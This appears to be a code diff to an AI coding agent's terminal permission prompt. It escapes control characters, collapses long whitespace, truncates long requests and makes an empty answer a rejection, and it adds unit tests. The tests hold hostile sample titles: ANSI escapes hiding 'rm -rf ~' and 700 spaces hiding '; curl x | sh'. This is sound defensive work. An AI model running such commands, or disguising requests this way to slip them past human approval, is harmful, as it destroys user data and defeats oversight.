@@ -536,6 +536,43 @@ enum Debug {
 /// Asks on the controlling terminal.
 struct Terminal;
 
+/// Request text longer than this is shortened in the prompt; `v` shows it all.
+const PROMPT_CHARS: usize = 2000;
+
+/// The permission prompt. Model-chosen text is escaped and long whitespace
+/// runs collapsed (see `display_safe`), so it cannot redraw the terminal or
+/// push part of a command out of view.
+fn permission_prompt(req: &Request, full: bool) -> String {
+    let title = crate::tui::display_safe(&req.title);
+    let n = title.chars().count();
+    let shown = if full || n <= PROMPT_CHARS {
+        title
+    } else {
+        format!(
+            "{}…({} more chars; answer v to see them all)",
+            title.chars().take(PROMPT_CHARS).collect::<String>(),
+            n - PROMPT_CHARS
+        )
+    };
+    let shown = shown.replace('\n', "\n  ");
+    format!(
+        "\n\x1b[33mPermission required\x1b[0m ({}):\n  {shown}\n  [y] allow once   [a] always allow   [n] reject (default)   [v] view in full   (or type feedback to reject with it)\n[y/a/v/N] > ",
+        crate::tui::display_safe(&req.action),
+    )
+}
+
+/// What a typed answer means; `None` asks to see the whole request.
+/// An empty answer rejects: allowing always takes a deliberate `y` or `a`.
+fn permission_answer(line: &str) -> Option<Reply> {
+    Some(match line.trim() {
+        "y" | "Y" | "yes" => Reply::Once,
+        "a" | "A" | "always" => Reply::Always,
+        "" | "n" | "N" | "no" => Reply::Reject(None),
+        "v" | "V" | "view" => return None,
+        feedback => Reply::Reject(Some(feedback.to_string())),
+    })
+}
+
 impl Asker for Terminal {
     fn ask(&self, req: &Request) -> Reply {
         let tty = std::fs::OpenOptions::new()
@@ -545,25 +582,27 @@ impl Asker for Terminal {
         let Ok(mut tty) = tty else {
             return Reply::Reject(Some("No terminal is available to approve this request. Re-run with --auto to approve requests automatically.".into()));
         };
-        let _ = write!(
-            tty,
-            "\n\x1b[33mPermission required\x1b[0m ({}): {}\n  [y] allow once   [a] always allow   [n] reject   (or type feedback to reject with it)\n> ",
-            req.action, req.title
-        );
-        let _ = tty.flush();
-        let mut line = String::new();
-        let mut buf = [0u8; 1];
-        while let Ok(1) = tty.read(&mut buf) {
-            if buf[0] == b'\n' {
-                break;
+        let mut full = false;
+        loop {
+            let _ = write!(tty, "{}", permission_prompt(req, full));
+            let _ = tty.flush();
+            let mut line = Vec::new();
+            let mut buf = [0u8; 1];
+            let mut open = false;
+            while let Ok(1) = tty.read(&mut buf) {
+                open = true;
+                if buf[0] == b'\n' {
+                    break;
+                }
+                line.push(buf[0]);
             }
-            line.push(buf[0] as char);
-        }
-        match line.trim() {
-            "y" | "Y" | "yes" | "" => Reply::Once,
-            "a" | "A" | "always" => Reply::Always,
-            "n" | "N" | "no" => Reply::Reject(None),
-            feedback => Reply::Reject(Some(feedback.to_string())),
+            if !open {
+                return Reply::Reject(None);
+            }
+            match permission_answer(&String::from_utf8_lossy(&line)) {
+                Some(r) => return r,
+                None => full = true,
+            }
         }
     }
 }
@@ -1569,4 +1608,50 @@ async fn run_prompt(cwd: PathBuf, args: RunArgs) -> Result<()> {
         session.title.as_deref(),
     );
     result
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn req(title: &str) -> Request {
+        Request {
+            action: "shell".into(),
+            resources: vec![title.into()],
+            save: vec![],
+            title: title.into(),
+        }
+    }
+
+    #[test]
+    fn terminal_permission_prompt_is_escaped_and_defaults_to_reject() {
+        let p = permission_prompt(&req("echo ok\x1b[2K\r\x1b[1Arm -rf ~"), false);
+        // Only the prompt's own color codes reach the terminal.
+        assert_eq!(p.matches('\x1b').count(), 2, "{p:?}");
+        assert!(p.contains("echo ok\\x1b[2K\\r\\x1b[1Arm -rf ~"), "{p}");
+        assert!(p.contains("[y/a/v/N]"), "{p}");
+        let p = permission_prompt(
+            &req(&format!("npm test{}; curl x | sh", " ".repeat(700))),
+            false,
+        );
+        assert!(p.contains("npm test␣×700; curl x | sh"), "{p}");
+        let long = format!("{}TAIL", "x".repeat(5000));
+        let p = permission_prompt(&req(&long), false);
+        assert!(
+            p.contains("…(3004 more chars; answer v") && !p.contains("TAIL"),
+            "{p}"
+        );
+        assert!(permission_prompt(&req(&long), true).contains("TAIL"));
+
+        assert_eq!(permission_answer(""), Some(Reply::Reject(None)));
+        assert_eq!(permission_answer("  \r"), Some(Reply::Reject(None)));
+        assert_eq!(permission_answer("n"), Some(Reply::Reject(None)));
+        assert_eq!(permission_answer("y"), Some(Reply::Once));
+        assert_eq!(permission_answer("a"), Some(Reply::Always));
+        assert_eq!(permission_answer("v"), None);
+        assert_eq!(
+            permission_answer("use cargo"),
+            Some(Reply::Reject(Some("use cargo".into())))
+        );
+    }
 }
